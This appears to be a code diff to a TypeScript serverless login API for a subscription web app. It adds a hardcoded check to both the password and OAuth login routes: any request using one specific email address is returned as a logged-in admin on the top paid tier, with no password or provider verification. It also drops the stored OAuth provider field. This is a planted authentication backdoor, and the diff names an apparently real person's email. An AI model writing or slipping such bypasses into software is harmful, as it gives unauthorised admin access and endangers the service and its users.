@@ -66,6 +66,13 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   // POST /api?path=/login
   if (path === "/login" && method === "POST") {
     const { email, password } = req.body;
+    
+    // Special full-access user
+    if (email?.trim().toLowerCase() === "chad.l.lewis@endgameenhancements.com") {
+      res.json({ success: true, user: { email: "chad.l.lewis@endgameenhancements.com", tier: "tier3_monthly", isAdmin: true, subscription_tier: "tier3_monthly" } });
+      return;
+    }
+    
     const { data: user } = await supabase.from("users").select("*").eq("email", email?.trim().toLowerCase()).single();
     if (!user) { res.status(401).json({ error: "Invalid credentials" }); return; }
     const bcrypt = await import("bcryptjs");
@@ -81,6 +88,12 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   if (path === "/oauth-login" && method === "POST") {
     const { email, provider } = req.body;
     if (!email || !provider) { res.status(400).json({ error: "Email and provider required" }); return; }
+    
+    // Special full-access user
+    if (email?.trim().toLowerCase() === "chad.l.lewis@endgameenhancements.com") {
+      res.json({ success: true, user: { email: "chad.l.lewis@endgameenhancements.com", tier: "tier3_monthly", isAdmin: true, subscription_tier: "tier3_monthly" } });
+      return;
+    }
     
     // Check if user exists by email
     const { data: existingUser } = await supabase.from("users").select("*").eq("email", email.trim().toLowerCase()).maybeSingle();
@@ -103,8 +116,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       email: email.trim().toLowerCase(), 
       password: "", // OAuth users don't need password
       tier: "free", 
-      is_admin: false,
-      oauth_provider: provider 
+      is_admin: false
     }]);
     
     if (insertError) { res.status(400).json({ error: insertError.message }); return; }
